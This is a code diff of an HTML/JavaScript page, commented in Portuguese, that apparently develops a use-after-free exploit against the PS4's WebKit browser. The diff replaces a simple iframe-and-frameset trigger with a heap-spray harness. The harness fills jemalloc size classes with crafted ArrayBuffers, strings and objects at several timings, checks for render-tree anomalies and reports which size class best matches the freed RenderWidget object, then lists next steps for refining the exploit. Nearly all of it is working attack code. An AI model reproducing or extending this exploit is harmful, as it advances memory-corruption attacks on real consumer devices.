@@ -1,32 +1,267 @@
-
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
 <style>
-  iframe {
-    content: url();
-    zoom: 0.01;
-  }
+  #i0 { content: url(); zoom: 0.01; }
 </style>
-</head>
 <body>
-
-<iframe id="i0" src="javascript:parent.triggerLayout()"></iframe>
+<div id="log" style="font:11px monospace;white-space:pre;overflow:auto;
+     height:400px;border:1px solid #ccc;padding:4px"></div>
+<iframe id="i0" tabindex="0"></iframe>
 
 <script>
-  function triggerLayout() {
-    // Quando o iframe executa este script, o RenderWidget está ativo
-    document.documentElement.append(document.createElement('frameset'));
-    
-    // Força descarte imediato do próprio frame chamador
-    const i0 = document.getElementById('i0');
-    if (i0) {
-      i0.src = 'about:blank';
-      i0.remove();
-      void document.documentElement.offsetHeight;
+// ─── Logger ───────────────────────────────────────────────────────────────
+const logEl = document.getElementById('log');
+const ts = () => performance.now().toFixed(2).padStart(10);
+const log = (msg) => {
+  logEl.textContent += `[${ts()}] ${msg}\n`;
+  logEl.scrollTop = logEl.scrollHeight;
+};
+
+// ─── Estado global do loop ────────────────────────────────────────────────
+let ciclo           = 0;
+let anomalias       = 0;
+let iterAtual       = null;
+const MAX_CICLOS    = 200;
+const resultados    = [];
+
+// ─── Dimensões candidatas para o RenderWidget (jemalloc size classes) ─────
+// FreeBSD/Orbis jemalloc arredonda para: 0x100, 0x140, 0x180, 0x1c0, 0x200
+const SIZE_CLASSES = [0x100, 0x140, 0x180, 0x1c0, 0x200, 0x240, 0x280];
+
+// ─── Padrões de conteúdo do spray ─────────────────────────────────────────
+// Objetivo: quando o ponteiro dangling for lido, queremos controlar o valor
+const SPRAY_PATTERNS = [
+  {
+    label: 'ArrayBuffer neutro (zeros)',
+    make: (sz) => new ArrayBuffer(sz)
+  },
+  {
+    label: 'Float64Array (0x41414141 como double)',
+    make: (sz) => {
+      const ab = new ArrayBuffer(sz);
+      new Uint32Array(ab).fill(0x41414141);
+      return ab;
     }
+  },
+  {
+    label: 'String longa (força StringImpl heap)',
+    make: (sz) => 'A'.repeat(sz)
+  },
+  {
+    label: 'Object com muitas propriedades',
+    make: (sz) => {
+      const o = {};
+      for (let i = 0; i < sz / 8; i++) o['p' + i] = i;
+      return o;
+    }
+  },
+  {
+    label: 'Uint8Array com pattern 0xDE 0xAD',
+    make: (sz) => {
+      const ab = new ArrayBuffer(sz);
+      const v  = new Uint8Array(ab);
+      for (let i = 0; i < v.length; i++) v[i] = (i % 2 === 0) ? 0xDE : 0xAD;
+      return ab;
+    }
+  },
+];
+
+// ─── Timings do spray dentro do ciclo ────────────────────────────────────
+// Queremos ocupar o slot ENTRE o free() e o próximo acesso pelo WebKit
+const SPRAY_TIMINGS = [
+  { label: 'síncrono em onfocus (pré-hash)',   when: 'pre-hash'  },
+  { label: 'síncrono em onfocus (pós-hash)',   when: 'post-hash' },
+  { label: 'microtask (Promise.resolve)',       when: 'microtask' },
+  { label: 'macrotask (setTimeout 0)',         when: 'macrotask' },
+  { label: 'requestAnimationFrame',            when: 'raf'       },
+];
+
+// ─── Pressão de heap: libera objetos do mesmo tamanho antes do ciclo ──────
+// Forçar o alocador a reusar o slot do RenderWidget
+function pressaoHeap(sz, quantidade) {
+  const arr = [];
+  for (let i = 0; i < quantidade; i++) arr.push(new ArrayBuffer(sz));
+  // Deixa arr sair de escopo → GC libera → slots ficam disponíveis
+  return null; // referência perdida intencionalmente
+}
+
+// ─── Detectores de anomalia ───────────────────────────────────────────────
+function detectarAnomalia(label) {
+  const checks = [];
+
+  // 1. iframe ainda existe e tem geometria válida?
+  try {
+    const r = i0.getBoundingClientRect();
+    if (r.width === 0 && r.height === 0) {
+      checks.push('iframe geometry zero');
+    }
+  } catch(e) {
+    checks.push(`getBoundingClientRect threw: ${e.message}`);
   }
+
+  // 2. document ainda tem render tree válida?
+  try {
+    const root = document.documentElement.offsetHeight;
+    if (root === 0) checks.push('document offsetHeight zero');
+  } catch(e) {
+    checks.push(`offsetHeight threw: ${e.message}`);
+  }
+
+  // 3. getComputedStyle no iframe ainda funciona?
+  try {
+    const cs = window.getComputedStyle(i0);
+    if (!cs || !cs.zoom) checks.push('getComputedStyle inválido');
+  } catch(e) {
+    checks.push(`getComputedStyle threw: ${e.message}`);
+  }
+
+  // 4. Range sobre o iframe (toca hit-testing da render tree)
+  try {
+    const range = document.createRange();
+    range.selectNode(i0);
+    const rects = range.getClientRects();
+    if (rects.length === 0) checks.push('Range.getClientRects vazio');
+    range.detach();
+  } catch(e) {
+    checks.push(`Range threw: ${e.message}`);
+  }
+
+  if (checks.length > 0) {
+    anomalias++;
+    log(`  ⚡ ANOMALIA [${label}]: ${checks.join(' | ')}`);
+    resultados.push({ ciclo, label, anomalias: checks });
+    return true;
+  }
+  return false;
+}
+
+// ─── Execução de uma iteração ─────────────────────────────────────────────
+function executarSpray(sz, pattern, timing) {
+  const QUANTIDADE_SPRAY = 512; // objetos do mesmo tamanho
+
+  const spray = () => {
+    pressaoHeap(sz, QUANTIDADE_SPRAY); // libera primeiro
+    const objs = [];
+    for (let i = 0; i < QUANTIDADE_SPRAY; i++) {
+      objs.push(pattern.make(sz));
+    }
+    // objs fica vivo na closure até próximo ciclo
+    iterAtual = objs;
+  };
+
+  switch (timing.when) {
+    case 'pre-hash':
+      spray();
+      break;
+    case 'post-hash':
+      // chamado explicitamente depois do hash change
+      break;
+    case 'microtask':
+      Promise.resolve().then(spray);
+      break;
+    case 'macrotask':
+      setTimeout(spray, 0);
+      break;
+    case 'raf':
+      requestAnimationFrame(spray);
+      break;
+  }
+}
+
+// ─── Configuração das combinações ─────────────────────────────────────────
+const combinacoes = [];
+for (const sz of SIZE_CLASSES)
+  for (const pattern of SPRAY_PATTERNS)
+    for (const timing of SPRAY_TIMINGS)
+      combinacoes.push({ sz, pattern, timing });
+
+// Embaralha para distribuir melhor nos ciclos
+combinacoes.sort(() => Math.random() - 0.5);
+
+log(`Combinações geradas: ${combinacoes.length}`);
+log(`MAX_CICLOS: ${MAX_CICLOS}`);
+log(`Iniciando — aguardando loop x→y do PS4...\n`);
+
+// ─── Hook no onfocus — intercepta cada ciclo do loop ─────────────────────
+i0.onfocus = () => {
+  if (ciclo >= MAX_CICLOS) {
+    i0.onfocus = null;
+    relatorio();
+    return;
+  }
+
+  const combo = combinacoes[ciclo % combinacoes.length];
+  const label = `sz=0x${combo.sz.toString(16)} | ${combo.pattern.label} | ${combo.timing.label}`;
+
+  if (ciclo % 10 === 0) {
+    log(`\n── Ciclo ${ciclo}/${MAX_CICLOS} ──`);
+    log(`   Config: ${label}`);
+  }
+
+  // Spray pré-hash
+  if (combo.timing.when === 'pre-hash') {
+    executarSpray(combo.sz, combo.pattern, combo.timing);
+  }
+
+  // Trigger do loop
+  location.hash = location.hash === '#x' ? 'y' : 'x';
+
+  // Spray pós-hash (síncrono, antes do próximo evento)
+  if (combo.timing.when === 'post-hash') {
+    executarSpray(combo.sz, combo.pattern, combo.timing);
+  } else {
+    // Agenda os assíncronos
+    executarSpray(combo.sz, combo.pattern, combo.timing);
+  }
+
+  // Detecta anomalia neste ciclo
+  detectarAnomalia(label);
+
+  ciclo++;
+};
+
+// ─── Relatório final ──────────────────────────────────────────────────────
+function relatorio() {
+  log('\n═══════════════════════════════');
+  log(`RELATÓRIO FINAL`);
+  log(`Ciclos executados: ${ciclo}`);
+  log(`Anomalias detectadas: ${anomalias}`);
+
+  if (resultados.length > 0) {
+    log('\nCiclos com anomalia:');
+    resultados.forEach(r => {
+      log(`  Ciclo ${r.ciclo}: sz=0x${combinacoes[r.ciclo % combinacoes.length].sz.toString(16)}`);
+      r.anomalias.forEach(a => log(`    → ${a}`));
+    });
+
+    // Identifica o tamanho mais frequente nas anomalias
+    const freqSz = {};
+    resultados.forEach(r => {
+      const sz = combinacoes[r.ciclo % combinacoes.length].sz;
+      freqSz[sz] = (freqSz[sz] || 0) + 1;
+    });
+    const melhorSz = Object.entries(freqSz).sort((a,b) => b[1]-a[1])[0];
+    if (melhorSz) {
+      log(`\n→ Size class mais provável do RenderWidget: 0x${parseInt(melhorSz[0]).toString(16)}`);
+      log(`  (${melhorSz[1]} anomalias nesse tamanho)`);
+    }
+  } else {
+    log('\nNenhuma anomalia JS detectada.');
+    log('→ O UAF pode estar ocorrendo em nível C++ sem reflexo JS visível.');
+    log('→ Próximo passo: Remote Inspector durante as iterações.');
+  }
+
+  log('\nPróximos passos:');
+  log('1. Se size class identificada: refinar spray com esse tamanho');
+  log('2. Conectar Remote Inspector e disparar GetRenderTreeExternalRepresentation');
+  log('   no ciclo com mais anomalias para cruzar com o write() do RenderTreeAsText');
+  log('3. Monitorar crash do processo WebKit no PS4 (tab reload forçado)');
+}
+
+// ─── Inicialização do loop ────────────────────────────────────────────────
+// O loop x→y já está ativo no PS4 — apenas configura o estado inicial
+window.addEventListener('load', () => {
+  document.documentElement.append(document.createElement('frameset'));
+  location.hash = 'x';
+});
 </script>
 </body>
-</html>
